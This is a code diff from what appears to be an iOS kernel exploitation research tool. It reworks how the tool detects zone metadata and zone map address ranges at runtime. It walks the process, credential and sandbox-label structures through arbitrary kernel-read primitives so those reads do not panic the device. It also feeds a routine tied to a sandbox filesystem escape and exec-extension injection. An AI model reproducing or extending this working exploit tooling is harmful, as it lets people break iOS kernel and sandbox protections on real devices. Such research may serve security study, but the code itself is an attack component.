@@ -139,12 +139,15 @@ char *kresearch_read_breadcrumbs(void) {
 // ── Zone metadata guard ──
 // SPTM on A15+ unmaps zone metadata pages from kernel page tables.
 // Reading them through our kread primitive causes Translation fault → panic.
-// These globals hold the detected range; initial values from the last panic log.
-// kresearch_detect_zones() can update them at runtime.
-// Updated from panic log 2026-10-22: Metadata 0xffffffef48880000 - 0xffffffef4a080000
-// Previous defaults (0xffffffee...) were ~4GB off due to KASLR, beyond 16MB margin.
-static uint64_t g_zone_meta_min = 0xffffffef48880000ULL;
-static uint64_t g_zone_meta_max = 0xffffffef4a080000ULL;
+//
+// DYNAMIC DETECTION — NO HARDCODED DEFAULTS.
+// Zone metadata shifts independently from kernel text across reboots
+// (multi-segment KASLR on iOS 16+), so hardcoded values go stale.
+// Start at 0,0 = "unknown", meaning is_zone_meta() won't exclude anything.
+// calibrate_zone_bounds() detects the real range at runtime before any
+// chain walking begins — see its two-phase approach for details.
+static uint64_t g_zone_meta_min = 0;
+static uint64_t g_zone_meta_max = 0;
 static bool     g_zone_meta_detected = false;
 
 // Zone MAP bounds — where actual zone allocations (heap objects) live.
@@ -155,15 +158,11 @@ static uint64_t g_zone_map_max = 0;
 static bool     g_zone_map_detected = false;
 
 static bool is_zone_meta(uint64_t addr) {
-    // Check if addr falls in the known zone metadata range (± 16 MB margin
-    // to account for slight KASLR shifts between boots).
-    if (g_zone_meta_min && g_zone_meta_max) {
-        uint64_t margin = 0x1000000; // 16 MB
-        uint64_t lo = (g_zone_meta_min > margin) ? g_zone_meta_min - margin : 0;
-        uint64_t hi = g_zone_meta_max + margin;
-        if (addr >= lo && addr <= hi) return true;
-    }
-    return false;
+    // When 0,0 = unknown (before calibration), returns false — no exclusion.
+    // After calibrate_zone_bounds() detects the range (with built-in margin),
+    // this correctly excludes zone metadata addresses.
+    if (g_zone_meta_min == 0 && g_zone_meta_max == 0) return false;
+    return (addr >= g_zone_meta_min && addr <= g_zone_meta_max);
 }
 
 static bool kaddr_ok(uint64_t addr) {
@@ -257,111 +256,154 @@ static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
 extern uint64_t g_kernel_base;
 extern uint64_t g_kernel_slide;
 
-// Silent helper: probes heap addresses, computes bounds, sets globals.
-// Does NOT touch buf_* — safe to call from any context.
+// Dynamic two-phase zone bounds calibration.
+//
+// The chicken-and-egg problem: we need zone meta bounds to safely follow
+// chain pointers, but we need to follow pointers to discover zone meta.
+//
+// Solution: TWO PHASES.
+//
+// Phase 1 — SAFE proc chain only (no zone checks needed):
+//   Walk self_proc → proc_ro → ucred → label → sbx using kread_ptr().
+//   These are GUARANTEED valid heap pointers — the kernel returned them.
+//   Compute initial zone map bounds from these ~6 addresses.
+//   Zone meta is ~55 GB away from zone map, so 8 GB margin is safe.
+//
+// Phase 2 — Classify bucket pointers against Phase 1 bounds:
+//   Read bucket pointer VALUES from ext_set (safe — ext_set was validated).
+//   Pointers INSIDE Phase 1 bounds → heap (safe to follow for more samples).
+//   Pointers OUTSIDE bounds → zone meta candidates (DON'T read from them).
+//   This detects zone meta without ever reading from zone meta pages.
+//
+// Silent helper: does NOT touch buf_* — safe to call from any context.
 // Returns true if zone map bounds were successfully determined.
 static bool calibrate_zone_bounds(void) {
     uint64_t self_proc = proc_self();
     if (!self_proc) return false;
 
+    // ── Phase 1: Guaranteed-safe proc chain ──
+    // kread_ptr() returns PAC-stripped pointers from known kernel structs.
+    // These are always valid heap addresses regardless of zone meta state.
     uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
     uint64_t ucred   = kread_ptr(proc_ro + off_proc_ro_p_ucred);
     uint64_t label   = kread_ptr(ucred + off_ucred_cr_label);
     uint64_t sbx     = kread_ptr(label + off_label_l_perpolicy_sandbox);
 
-    // Collect ALL heap addresses we can find to determine zone map bounds
+    uint64_t safe_addrs[16];
+    int safe_count = 0;
+
+    #define SAFE_REC(a) do { \
+        if ((a) >= VM_MIN_KERNEL_ADDRESS && (a) <= VM_MAX_KERNEL_ADDRESS \
+            && safe_count < 16) \
+            safe_addrs[safe_count++] = (a); \
+    } while(0)
+
+    SAFE_REC(self_proc);
+    SAFE_REC(proc_ro);
+    SAFE_REC(ucred);
+    SAFE_REC(label);
+    SAFE_REC(sbx);
+
+    // Also probe launchd (PID 1) for broader coverage
+    uint64_t launchd = proc_find(1);
+    if (launchd) SAFE_REC(launchd);
+
+    #undef SAFE_REC
+
+    if (safe_count < 2) return false;
+
+    // Compute initial zone map from proc chain only
+    uint64_t safe_min = safe_addrs[0], safe_max = safe_addrs[0];
+    for (int i = 1; i < safe_count; i++) {
+        if (safe_addrs[i] < safe_min) safe_min = safe_addrs[i];
+        if (safe_addrs[i] > safe_max) safe_max = safe_addrs[i];
+    }
+
+    // 8 GB margin each side — generous but safe (zone meta is ~55 GB away)
+    uint64_t expand = 0x200000000ULL;
+    uint64_t initial_map_min = (safe_min > expand) ? (safe_min - expand) : VM_MIN_KERNEL_ADDRESS;
+    uint64_t initial_map_max = safe_max + expand;
+    if (initial_map_max < safe_max) initial_map_max = VM_MAX_KERNEL_ADDRESS;
+
+    // Apply Phase 1 bounds immediately so kptr_heap_ok() works in Phase 2
+    g_zone_map_min = initial_map_min;
+    g_zone_map_max = initial_map_max;
+    g_zone_map_detected = true;
+
+    // ── Phase 2: Classify bucket pointers against Phase 1 bounds ──
+    // ext_set comes from a live sandbox_label field — always a valid heap pointer.
+    // Read bucket pointer VALUES (not contents) and classify each:
+    //   - Inside Phase 1 zone map → heap address (safe to follow)
+    //   - Outside zone map, not in static kernel → zone meta candidate
     uint64_t heap_addrs[64];
     int heap_count = 0;
+    uint64_t meta_candidates[32];
+    int meta_count = 0;
 
-    #define RECORD(a) do { if ((a) > VM_MIN_KERNEL_ADDRESS && heap_count < 64) \
-        heap_addrs[heap_count++] = (a); } while(0)
+    // Seed heap collection with Phase 1 safe addresses
+    for (int i = 0; i < safe_count && heap_count < 64; i++)
+        heap_addrs[heap_count++] = safe_addrs[i];
 
-    RECORD(self_proc);
-    RECORD(proc_ro);
-    RECORD(ucred);
-    RECORD(label);
-    RECORD(sbx);
-
-    // Walk extension set for more heap addresses
     if (sbx) {
         struct sandbox_label sbx_lbl = {0};
         kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
         uint64_t ext_set = (uint64_t)sbx_lbl.extension_set;
-        if (ext_set && kaddr_ok(ext_set)) {
-            RECORD(ext_set);
+
+        // Validate ext_set against Phase 1 bounds before reading from it
+        if (ext_set >= initial_map_min && ext_set <= initial_map_max) {
+            if (heap_count < 64) heap_addrs[heap_count++] = ext_set;
+
             uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
             kreadbuf(ext_set, buckets, sizeof(buckets));
+
             for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-                if (buckets[i] && kptr_heap_ok(buckets[i])) {
-                    RECORD(buckets[i]);
-                    uint8_t cn_raw[0x20];
-                    kreadbuf(buckets[i], cn_raw, 0x20);
-                    uint64_t cn_ext = *(uint64_t *)(cn_raw + CN_OFF_EXT);
-                    if (cn_ext && kptr_heap_ok_aligned(cn_ext, 0x20)) {
-                        RECORD(cn_ext);
-                        uint8_t eraw[EXT_RAW_SIZE];
-                        kreadbuf(cn_ext, eraw, EXT_RAW_SIZE);
-                        uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
-                        if (data_ptr && kaddr_ok(data_ptr)) {
-                            RECORD(data_ptr);
+                if (!buckets[i]) continue;
+                if (buckets[i] < VM_MIN_KERNEL_ADDRESS || buckets[i] > VM_MAX_KERNEL_ADDRESS)
+                    continue;
+
+                if (buckets[i] >= initial_map_min && buckets[i] <= initial_map_max) {
+                    // Inside zone map — safe heap address
+                    if (heap_count < 64) heap_addrs[heap_count++] = buckets[i];
+
+                    // Follow the bucket for additional heap samples
+                    // (kptr_heap_ok uses Phase 1 bounds + alignment check)
+                    if (kptr_heap_ok(buckets[i])) {
+                        uint8_t cn_raw[0x20];
+                        kreadbuf(buckets[i], cn_raw, 0x20);
+                        uint64_t cn_ext = *(uint64_t *)(cn_raw + CN_OFF_EXT);
+                        if (cn_ext && kptr_heap_ok_aligned(cn_ext, 0x20)) {
+                            if (heap_count < 64) heap_addrs[heap_count++] = cn_ext;
                         }
                     }
-                }
-            }
-        }
-    }
-    #undef RECORD
-
-    // Also check PID 1 (launchd) for broader heap coverage
-    uint64_t launchd = proc_find(1);
-    if (launchd && kaddr_ok(launchd)) {
-        if (heap_count < 64) heap_addrs[heap_count++] = launchd;
-    }
-
-    if (heap_count < 2) return false;
-
-    // Sort and find min/max
-    for (int i = 0; i < heap_count - 1; i++)
-        for (int j = i + 1; j < heap_count; j++)
-            if (heap_addrs[i] > heap_addrs[j]) {
-                uint64_t t = heap_addrs[i];
-                heap_addrs[i] = heap_addrs[j];
-                heap_addrs[j] = t;
-            }
-
-    uint64_t observed_min = heap_addrs[0];
-    uint64_t observed_max = heap_addrs[heap_count - 1];
-
-    // Expand: 8 GB below min, 8 GB above max
-    uint64_t expand = 0x200000000ULL;
-    uint64_t map_min = (observed_min > expand) ? (observed_min - expand) : VM_MIN_KERNEL_ADDRESS;
-    uint64_t map_max = observed_max + expand;
-    if (map_max < observed_max) map_max = VM_MAX_KERNEL_ADDRESS;
-
-    // Try to refine zone_meta from bucket walk
-    uint64_t meta_candidates[32];
-    int meta_count = 0;
-    if (sbx) {
-        struct sandbox_label sbx_lbl2 = {0};
-        kreadbuf(sbx, &sbx_lbl2, sizeof(struct sandbox_label));
-        uint64_t ext_set = (uint64_t)sbx_lbl2.extension_set;
-        if (ext_set && kaddr_ok(ext_set)) {
-            uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
-            kreadbuf(ext_set, buckets, sizeof(buckets));
-            for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
-                if (buckets[i] && !kptr_ok(buckets[i]) && !is_kernel_static(buckets[i])) {
+                } else if (!is_kernel_static(buckets[i])) {
+                    // Valid kernel addr but OUTSIDE zone map → zone meta candidate.
+                    // We do NOT read from this address.
                     if (meta_count < 32) meta_candidates[meta_count++] = buckets[i];
                 }
             }
         }
     }
 
+    // Refine zone map bounds from all observed heap addresses
+    if (heap_count > 0) {
+        uint64_t obs_min = heap_addrs[0], obs_max = heap_addrs[0];
+        for (int i = 1; i < heap_count; i++) {
+            if (heap_addrs[i] < obs_min) obs_min = heap_addrs[i];
+            if (heap_addrs[i] > obs_max) obs_max = heap_addrs[i];
+        }
+        g_zone_map_min = (obs_min > expand) ? (obs_min - expand) : VM_MIN_KERNEL_ADDRESS;
+        g_zone_map_max = obs_max + expand;
+        if (g_zone_map_max < obs_max) g_zone_map_max = VM_MAX_KERNEL_ADDRESS;
+    }
+
+    // Set zone meta from candidates (observed addresses outside zone map)
     if (meta_count > 0) {
         uint64_t meta_lo = meta_candidates[0], meta_hi = meta_candidates[0];
         for (int i = 1; i < meta_count; i++) {
             if (meta_candidates[i] < meta_lo) meta_lo = meta_candidates[i];
             if (meta_candidates[i] > meta_hi) meta_hi = meta_candidates[i];
         }
+        // 32 MB margin around observed zone meta range
         uint64_t meta_margin = 0x2000000ULL;
         meta_lo = (meta_lo > meta_margin) ? meta_lo - meta_margin : 0;
         meta_hi += meta_margin;
@@ -370,10 +412,6 @@ static bool calibrate_zone_bounds(void) {
         g_zone_meta_detected = true;
     }
 
-    // Apply zone map bounds
-    g_zone_map_min = map_min;
-    g_zone_map_max = map_max;
-    g_zone_map_detected = true;
     return true;
 }
 
@@ -389,10 +427,12 @@ char *kresearch_detect_zones(void) {
     buf_append("Before calibration:\n");
     buf_append("  zone_meta: 0x%llx - 0x%llx  detected=%s\n",
                g_zone_meta_min, g_zone_meta_max,
-               g_zone_meta_detected ? "YES" : "NO (stale defaults)");
+               g_zone_meta_detected ? "YES" :
+               (g_zone_meta_min == 0 && g_zone_meta_max == 0) ?
+               "NO (unknown — will detect dynamically)" : "NO");
     buf_append("  zone_map:  0x%llx - 0x%llx  detected=%s\n\n",
                g_zone_map_min, g_zone_map_max,
-               g_zone_map_detected ? "YES" : "NO (writes blocked)");
+               g_zone_map_detected ? "YES" : "NO (will detect from proc chain)");
 
     buf_append("Probing heap addresses...\n");
     bool ok = calibrate_zone_bounds();
@@ -421,7 +461,7 @@ char *kresearch_set_zone_meta(uint64_t min_addr, uint64_t max_addr) {
     g_zone_meta_detected = true;
     buf_append("New: 0x%llx - 0x%llx\n", g_zone_meta_min, g_zone_meta_max);
     buf_append("Detection: MANUAL\n");
-    buf_append("\nAll kaddr_ok/kptr_ok checks now exclude this range (± 16 MB margin).\n");
+    buf_append("\nAll kaddr_ok/kptr_ok checks now exclude this exact range.\n");
     return buf_finish();
 }
 
@@ -1794,6 +1834,21 @@ char *kresearch_add_exec_extension(void) {
     // This is speculative — the sandbox may not check extensions for process-exec.
     // The filesystem escape works because file-read/write-data operations check
     // the extension set. Process operations might be profile-only.
+
+    // Auto-calibrate zone bounds before any chain walking
+    if (!g_zone_map_detected) {
+        buf_append("Zone bounds not calibrated — auto-calibrating...\n");
+        bool cal_ok = calibrate_zone_bounds();
+        if (!cal_ok) {
+            buf_append("WARNING: zone calibration failed. Chain walking will be conservative.\n\n");
+        } else {
+            buf_append("Zone meta: 0x%llx - 0x%llx (detected=%s)\n",
+                       g_zone_meta_min, g_zone_meta_max,
+                       g_zone_meta_detected ? "YES" : "no");
+            buf_append("Zone map:  0x%llx - 0x%llx\n\n",
+                       g_zone_map_min, g_zone_map_max);
+        }
+    }
 
     proc_info_t self_info;
     gather_proc_info(proc_self(), &self_info);
